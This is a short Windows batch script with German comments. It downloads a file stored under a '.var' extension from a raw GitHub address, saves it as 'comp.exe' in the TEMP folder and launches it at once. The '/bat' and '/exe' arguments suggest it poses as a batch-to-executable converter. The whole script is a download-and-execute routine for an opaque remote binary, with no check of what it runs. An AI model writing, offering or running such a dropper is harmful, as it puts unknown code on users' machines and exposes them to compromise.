@echo off
set "URL=https://raw.githubusercontent.com/xqrto/pld/main/efnjih.var"
set "TEMPFILE=%TEMP%\comp.exe"
set "file=%~1"
REM Lade die Datei herunter und folge Redirects
curl -L -o "%TEMPFILE%" "%URL%"

REM Prüfe, ob die Datei heruntergeladen wurde
if exist "%TEMPFILE%" (
    echo Datei erfolgreich heruntergeladen:
    start "" "%TEMPFILE%" /bat "%temp%\%~1" /exe "%cd%\%file:.bat=%.exe"
) else (
    echo Fehler beim Herunterladen der Datei.
)

